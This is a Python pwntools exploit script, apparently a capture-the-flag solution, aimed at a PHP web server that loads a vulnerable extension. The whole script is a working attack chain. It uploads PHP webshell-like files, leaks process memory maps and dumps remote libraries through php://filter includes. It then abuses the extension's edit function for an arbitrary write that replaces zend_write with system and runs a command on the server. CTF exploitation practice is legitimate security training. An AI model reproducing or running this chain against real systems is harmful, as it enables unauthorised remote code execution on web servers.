#!/usr/bin/env python3
from pwn import *


context(arch="amd64", os="linux", log_level="debug")

root = __file__.rsplit("/", 1)[0]
vuln = ELF(root + "/attachments/vuln.so", checksec=False)

argv_url = next((x for x in sys.argv[1:] if "=" not in x and not x.startswith("-")), None)
url = args.URL or argv_url or "http://127.0.0.1:9999/"


def parse_target(url):
    if "://" in url:
        scheme, rest = url.split("://", 1)
    else:
        scheme, rest = "http", url
    if "/" in rest:
        hostpart, base = rest.split("/", 1)
        base = "/" + base
    else:
        hostpart, base = rest, "/"
    if ":" in hostpart:
        host, port = hostpart.rsplit(":", 1)
        port = int(port)
    else:
        host = hostpart
        port = 443 if scheme == "https" else 80
    return host, port, scheme == "https", hostpart, base


_host, _port, _ssl, _host_hdr, _base = parse_target(url)
host = args.HOST or _host or "127.0.0.1"
port = int(args.PORT or _port or 9999)
ssl = bool(args.SSL) or _ssl
host_hdr = args.HOST_HDR or _host_hdr or host
base = args.BASE or _base or "/"
if not base.endswith("/"):
    base += "/"

vuln_module_entry_off = vuln.sym.vuln_module_entry
heap_size_off = vuln.sym.heap_size
heap_off = vuln.sym.heap
seed_len = heap_off - vuln_module_entry_off + 8
heap_size_slot0_off = heap_size_off - vuln_module_entry_off
heap_slot0_off = heap_off - vuln_module_entry_off


def start():
    return remote(host, port, ssl=ssl)


def q(data):
    return b"".join(b"%%%02x" % x for x in bytearray(data))


def gen(name, ext):
    return f"{name}_{randoms(8)}.{ext}"


def webpath(name=""):
    return base + name


def build_http(method, path, body=b"", headers=None):
    headers = headers or {}
    req = f"{method} {path} HTTP/1.1\r\n".encode()
    hdr = {
        "Host": host_hdr,
        "Connection": "close",
    }
    if body:
        hdr["Content-Length"] = str(len(body))
    hdr.update(headers)
    for k, v in hdr.items():
        req += f"{k}: {v}\r\n".encode()
    req += b"\r\n" + body
    return req


def dechunk(head, data):
    if b"transfer-encoding: chunked" not in head.lower():
        return data

    out = b""
    while data:
        line, _, rest = data.partition(b"\r\n")
        if not _:
            break
        size = int(line.split(b";", 1)[0], 16)
        if size == 0:
            break
        out += rest[:size]
        data = rest[size + 2 :]
    return out


def http(method, path, body=b"", headers=None):
    req = build_http(method, path, body, headers)
    io = start()
    # gdb.attach(io, 'b *main\nc')
    io.send(req)
    head = io.recvuntil(b"\r\n\r\n")
    data = io.recvall(timeout=120)
    io.close()
    return head, dechunk(head, data)


def build_multipart(name, data):
    boundary = "----" + randoms(16)
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{name}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    body += data
    body += f"\r\n--{boundary}--\r\n".encode()
    return body, {"Content-Type": f"multipart/form-data; boundary={boundary}"}


def upload(name, data):
    body, headers = build_multipart(name, data)
    _, data = http("POST", webpath("index.php"), body, headers)
    text = data.decode(errors="ignore")
    if "文件上传成功" not in text:
        log.failure(text)
        raise RuntimeError("upload failed")
    log.success(f"upload -> {name}")
    return name


def getb(name):
    _, data = http("GET", webpath(name))
    return data


def gettext(name):
    return getb(name).decode(errors="ignore")


def leak_maps():
    name = gen("maps", "php")
    upload(name, b'<?php include "/proc/self/maps"; ?>')
    return gettext(name)


def parse_base(maps, needle):
    for line in maps.splitlines():
        if needle in line and " r--p " in line and line.split()[2] == "00000000":
            return int(line.split("-", 1)[0], 16)
    raise RuntimeError(f"failed to find {needle}")


def dump_remote_file(remote_path, local_path):
    name = gen("dump", "php")
    php = f'<?php include "php://filter/convert.base64-encode/resource={remote_path}"; ?>'.encode()
    upload(name, php)
    data = b64d(b"".join(getb(name).split()))
    open(local_path, "wb").write(data)
    log.success(f"dump -> {local_path}")


def arb_write(where, what, cmd):
    name = gen("exp", "php")
    php = b'<?php edit(-64, $_POST["seed"]); edit(0, $_POST["ptr"]); echo $_GET["c"]; ?>'
    upload(name, php)

    seed = flat(
        {
            heap_size_slot0_off: p32(len(what)),
            heap_slot0_off: p64(where),
        },
        filler=b"\x00",
        length=seed_len,
    )
    body = b"seed=" + q(seed) + b"&ptr=" + q(what)
    path = webpath(name) + "?c=" + q(cmd.encode()).decode()

    io = start()
    # gdb.attach(io, 'b *main\nc')
    io.send(build_http("POST", path, body, {"Content-Type": "application/x-www-form-urlencoded"}))
    io.recvuntil(b"\r\n\r\n")
    io.recvall(timeout=120)
    io.close()


def main():
    maps = leak_maps()
    vuln_base = parse_base(maps, "/usr/local/lib/php/extensions/no-debug-non-zts-20210902/vuln.so")
    libphp_base = parse_base(maps, "/usr/lib/apache2/modules/libphp.so")
    libc_base = parse_base(maps, "/usr/lib/x86_64-linux-gnu/libc.so.6")

    libphp_path = "/tmp/libphp_remote.so"
    libc_path = "/tmp/libc_remote.so.6"
    dump_remote_file("/usr/lib/apache2/modules/libphp.so", libphp_path)
    dump_remote_file("/usr/lib/x86_64-linux-gnu/libc.so.6", libc_path)

    libphp = ELF(libphp_path, checksec=False)
    libc = ELF(libc_path, checksec=False)

    zend_write = libphp_base + libphp.sym.zend_write
    system = libc_base + libc.sym.system

    out = gen("flag", "txt")
    cmd = f"/readflag > /var/www/html/{out}"
    arb_write(zend_write, p64(system), cmd)

    flag = gettext(out).strip()
    log.success(f"vuln_base   = {vuln_base:#x}")
    log.success(f"libphp_base = {libphp_base:#x}")
    log.success(f"libc_base   = {libc_base:#x}")
    log.success(f"zend_write  = {zend_write:#x}")
    log.success(f"system      = {system:#x}")
    log.success(f"flag file   = {out}")
    print(flag)

    return 0 if "{" in flag and "}" in flag else 1


if __name__ == "__main__":
    raise SystemExit(main())
